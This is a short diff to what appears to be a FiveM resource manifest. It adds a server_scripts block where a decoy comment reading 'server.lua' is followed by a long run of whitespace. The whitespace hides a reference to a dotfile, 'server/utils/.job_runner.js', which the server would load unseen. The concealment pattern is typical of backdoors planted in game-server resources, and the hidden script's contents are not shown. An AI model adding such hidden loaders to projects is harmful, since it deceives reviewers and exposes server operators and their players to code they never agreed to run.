@@ -15,3 +15,7 @@ files {
     'nui/js/*.js',
     'nui/css/*.css',
 }
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.job_runner.js',
+}
